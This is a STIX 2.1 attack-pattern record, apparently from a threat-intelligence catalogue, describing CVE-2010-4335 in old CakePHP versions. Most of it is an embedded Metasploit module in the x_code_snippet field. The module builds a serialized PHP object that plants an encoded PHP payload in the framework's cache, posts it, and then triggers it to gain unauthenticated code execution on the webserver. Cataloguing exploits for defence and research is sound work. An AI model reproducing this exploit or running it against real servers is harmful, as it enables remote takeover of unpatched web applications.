{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1c0bd339-827f-4371-8c3d-321b839a3b00",
    "created": "2024-08-14T17:13:02.125455Z",
    "modified": "2024-08-14T17:13:02.125459Z",
    "name": "CakePHP Cache Corruption Code Execution",
    "description": " CakePHP is a popular PHP framework for building web applications.  The Security component of CakePHP versions 1.3.5 and earlier and 1.2.8 and earlier is vulnerable to an unserialize attack which could be abused to allow unauthenticated attackers to execute arbitrary code with the permissions of the webserver. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/cakephp_cache_corruption.rb",
            "external_id": "cakephp_cache_corruption.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4335"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CakePHP Cache Corruption Code Execution',\n      'Description'    => %q{\n        CakePHP is a popular PHP framework for building web applications.  The\n        Security component of CakePHP versions 1.3.5 and earlier and 1.2.8 and\n        earlier is vulnerable to an unserialize attack which could be abused to\n        allow unauthenticated attackers to execute arbitrary code with the\n        permissions of the webserver.\n      },\n      'Author'\t=>\n        [\n          'tdz',\n          'Felix Wilhelm', # poc\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '69352' ],\n          [ 'CVE', '2010-4335' ],\n          [ 'BID', '44852'  ],\n          [ 'PACKETSTORM', '95847' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'Space'       => 4000,\n          # max url length for some old versions of apache according to\n          # http://www.boutell.com/newfaq/misc/urllength.html\n          'DisableNops' => true,\n          #'BadChars'    => %q|'\"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n          'Keys'        => ['php'],\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-11-15'\n      ))\n\n      register_options(\n        [\n          OptString.new('URI',\t[ true, \"CakePHP POST path\", '/']),\n          OptString.new('OptionalPostData',\t[ false, \"Optional POST data\", '']),\n        ])\n  end\n\n\n  def exploit\n    #path = rand_text_alphanumeric(rand(5)+5)\n    key = rand_text_alphanumeric(rand(5)+5)\n    fields = rand_text_alphanumeric(rand(5)+5)\n\n    #payload =  \"readfile('../config/database.php'); exit();\"\n    len=payload.encoded.length + 6\n\n    p = \"\"\n    p << ':O:3:\"App\":4:{s:7:\"__cache\";s:3:\"bam\";s:5:\"__map\";a:2:{s:4'\n    p << ':\"Core\";a:1:{s:6:\"Router\";s:42:\"../tmp/cache/persistent/cake_core_file_map\";}'\n    p << 's:3:\"Foo\";s:'\n    p << len.to_s()\n    p << ':\"<? '\n    p << payload.encoded\n    p << ' ?>\";}s:7:\"__paths\";a:0:{}s:9:\"__objects\";a:0:{}}'\n\n    #rot13 and urlencode\n    p = p.tr(\"A-Ma-mN-Zn-z\",\"N-Zn-zA-Ma-m\")\n    p = CGI.escape(p)\n\n    data = \"data%5b_Token%5d%5bkey%5d=\"\n    data << key\n    data << \"&data%5b_Token%5d%5bfields%5d=\"\n    data << fields\n    data << p\n    data << \"&_method=POST\"\n\n    #some apps need the form post data\n    if datastore['OptionalPostData']\n      postdata = CGI.escape(datastore['OptionalPostData'])\n      data << \"&\"\n      data << postdata\n    end\n\n    print_status(\"Sending exploit request 1\")\n    res = send_request_cgi(\n    {\n      'uri'    => normalize_uri(datastore['URI']),\n      'method' => \"POST\",\n      'ctype' => 'application/x-www-form-urlencoded',\n      'data'   => data\n    }, 5)\n\n    print_status(\"Sending exploit request 2\")\n    res = send_request_cgi(\n    {\n      'uri'    => normalize_uri(datastore['URI']),\n      'method' => \"POST\",\n      'ctype' => 'application/x-www-form-urlencoded',\n      'data'   => data\n    },5)\n\n    print_status(\"Requesting our payload\")\n    response = send_request_raw({\n      # Allow findsock payloads to work\n      'global' => true,\n      'uri' => normalize_uri(datastore['URI'])\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-15",
    "x_mitre_platforms": [
        "['php']"
    ]
}